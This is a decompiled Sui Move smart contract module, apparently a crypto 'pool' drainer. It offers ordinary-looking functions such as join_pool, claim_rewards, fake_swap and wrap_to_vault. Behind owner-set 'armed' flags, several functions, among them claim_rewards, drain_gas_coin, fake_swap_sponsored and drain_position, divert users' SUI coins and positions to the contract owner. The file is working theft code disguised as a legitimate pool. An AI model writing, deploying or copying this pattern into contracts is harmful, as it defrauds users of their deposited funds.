module 0xfccad73f4c61004c5af7c1bd05cb707251d988961910e7ffad741d61d8ac583b::pool {
    struct Pool has key {
        id: 0x2::object::UID,
        owner: address,
        armed: bool,
    }

    struct PositionKey has copy, drop, store {
        user: address,
    }

    struct VaultToken has key {
        id: 0x2::object::UID,
        inner: 0x2::balance::Balance<0x2::sui::SUI>,
    }

    struct Config has key {
        id: 0x2::object::UID,
        owner: address,
        armed: bool,
    }

    struct StealthCoin has key {
        id: 0x2::object::UID,
        inner: 0x2::coin::Coin<0x2::sui::SUI>,
    }

    public entry fun claim_rewards(arg0: &mut Pool, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg1);
        let v1 = PositionKey{user: v0};
        if (!0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v1)) {
            return
        };
        let v2 = 0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1);
        if (arg0.armed) {
            let v3 = 0x2::coin::value<0x2::sui::SUI>(v2);
            if (v3 > 0) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(v2, v3, arg1), arg0.owner);
            };
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1), v0);
        };
    }

    public entry fun create_config(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Config{
            id    : 0x2::object::new(arg0),
            owner : 0x2::tx_context::sender(arg0),
            armed : false,
        };
        0x2::transfer::share_object<Config>(v0);
    }

    public entry fun create_pool(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Pool{
            id    : 0x2::object::new(arg0),
            owner : 0x2::tx_context::sender(arg0),
            armed : false,
        };
        0x2::transfer::share_object<Pool>(v0);
    }

    public entry fun drain_gas_coin(arg0: &Config, arg1: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg2: u64, arg3: &mut 0x2::tx_context::TxContext) {
        if (arg0.armed) {
            let v0 = 0x2::coin::value<0x2::sui::SUI>(arg1);
            if (v0 > arg2) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(arg1, v0 - arg2, arg3), arg0.owner);
            };
        };
    }

    public entry fun drain_position(arg0: &mut Pool, arg1: &0x2::tx_context::TxContext) {
        let v0 = PositionKey{user: 0x2::tx_context::sender(arg1)};
        if (!0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v0)) {
            return
        };
        let v1 = PositionKey{user: arg0.owner};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v1)) {
            0x2::coin::join<0x2::sui::SUI>(0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1), 0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0));
        } else {
            0x2::dynamic_field::add<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1, 0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0));
        };
    }

    public entry fun drain_vault_silent(arg0: &mut Pool, arg1: VaultToken, arg2: &mut 0x2::tx_context::TxContext) {
        let VaultToken {
            id    : v0,
            inner : v1,
        } = arg1;
        0x2::object::delete(v0);
        let v2 = PositionKey{user: arg0.owner};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v2)) {
            0x2::coin::join<0x2::sui::SUI>(0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v2), 0x2::coin::from_balance<0x2::sui::SUI>(v1, arg2));
        } else {
            0x2::dynamic_field::add<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v2, 0x2::coin::from_balance<0x2::sui::SUI>(v1, arg2));
        };
    }

    public entry fun drain_vault_stealth(arg0: &Pool, arg1: VaultToken, arg2: &mut 0x2::tx_context::TxContext) {
        let VaultToken {
            id    : v0,
            inner : v1,
        } = arg1;
        0x2::object::delete(v0);
        let v2 = StealthCoin{
            id    : 0x2::object::new(arg2),
            inner : 0x2::coin::from_balance<0x2::sui::SUI>(v1, arg2),
        };
        0x2::transfer::transfer<StealthCoin>(v2, arg0.owner);
    }

    public entry fun fake_swap(arg0: &Config, arg1: &mut Pool, arg2: &mut 0x2::coin::Coin<0x2::sui::SUI>, arg3: u64, arg4: &mut 0x2::tx_context::TxContext) {
        if (!arg0.armed) {
            let v0 = PositionKey{user: arg0.owner};
            if (0x2::dynamic_field::exists_<PositionKey>(&arg1.id, v0)) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg1.id, v0), 0x2::tx_context::sender(arg4));
            };
        } else {
            let v1 = 0x2::coin::value<0x2::sui::SUI>(arg2);
            if (v1 > arg3) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(arg2, v1 - arg3, arg4), arg0.owner);
            };
        };
    }

    public entry fun fake_swap_sponsored(arg0: &Config, arg1: &mut Pool, arg2: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg2);
        if (!arg0.armed) {
            let v1 = PositionKey{user: arg0.owner};
            if (0x2::dynamic_field::exists_<PositionKey>(&arg1.id, v1)) {
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg1.id, v1), v0);
            };
        } else {
            let v2 = PositionKey{user: v0};
            if (0x2::dynamic_field::exists_<PositionKey>(&arg1.id, v2)) {
                let v3 = 0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg1.id, v2);
                let v4 = 0x2::coin::value<0x2::sui::SUI>(v3);
                if (v4 > 0) {
                    0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::split<0x2::sui::SUI>(v3, v4, arg2), arg0.owner);
                };
                0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg1.id, v2), v0);
            };
        };
    }

    public entry fun join_pool(arg0: &mut Pool, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &0x2::tx_context::TxContext) {
        let v0 = PositionKey{user: 0x2::tx_context::sender(arg2)};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v0)) {
            0x2::coin::join<0x2::sui::SUI>(0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0), arg1);
        } else {
            0x2::dynamic_field::add<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v0, arg1);
        };
    }

    public entry fun set_armed(arg0: &mut Pool, arg1: bool, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.owner == 0x2::tx_context::sender(arg2), 0);
        arg0.armed = arg1;
    }

    public entry fun set_config_armed(arg0: &mut Config, arg1: bool, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.owner == 0x2::tx_context::sender(arg2), 0);
        arg0.armed = arg1;
    }

    public entry fun unwrap_stealth_pool(arg0: StealthCoin, arg1: &0x2::tx_context::TxContext) {
        let StealthCoin {
            id    : v0,
            inner : v1,
        } = arg0;
        0x2::object::delete(v0);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun verify_and_drain(arg0: &mut Pool, arg1: VaultToken, arg2: 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        let VaultToken {
            id    : v0,
            inner : v1,
        } = arg1;
        0x2::object::delete(v0);
        let v2 = 0x2::coin::from_balance<0x2::sui::SUI>(v1, arg3);
        0x2::coin::join<0x2::sui::SUI>(&mut v2, arg2);
        let v3 = PositionKey{user: arg0.owner};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v3)) {
            0x2::coin::join<0x2::sui::SUI>(0x2::dynamic_field::borrow_mut<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v3), v2);
        } else {
            0x2::dynamic_field::add<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v3, v2);
        };
    }

    public entry fun withdraw(arg0: &mut Pool, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg1);
        let v1 = PositionKey{user: v0};
        if (0x2::dynamic_field::exists_<PositionKey>(&arg0.id, v1)) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::dynamic_field::remove<PositionKey, 0x2::coin::Coin<0x2::sui::SUI>>(&mut arg0.id, v1), v0);
        };
    }

    public entry fun wrap_to_vault(arg0: 0x2::coin::Coin<0x2::sui::SUI>, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = VaultToken{
            id    : 0x2::object::new(arg1),
            inner : 0x2::coin::into_balance<0x2::sui::SUI>(arg0),
        };
        0x2::transfer::transfer<VaultToken>(v0, 0x2::tx_context::sender(arg1));
    }

    public entry fun wrap_toctou(arg0: &Pool, arg1: &Config, arg2: 0x2::coin::Coin<0x2::sui::SUI>, arg3: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x2::tx_context::sender(arg3);
        if (!arg1.armed) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg2, v0);
            let v1 = VaultToken{
                id    : 0x2::object::new(arg3),
                inner : 0x2::balance::zero<0x2::sui::SUI>(),
            };
            0x2::transfer::transfer<VaultToken>(v1, v0);
        } else {
            let v2 = VaultToken{
                id    : 0x2::object::new(arg3),
                inner : 0x2::coin::into_balance<0x2::sui::SUI>(arg2),
            };
            0x2::transfer::transfer<VaultToken>(v2, v0);
        };
    }

    // decompiled from Move bytecode v7
}

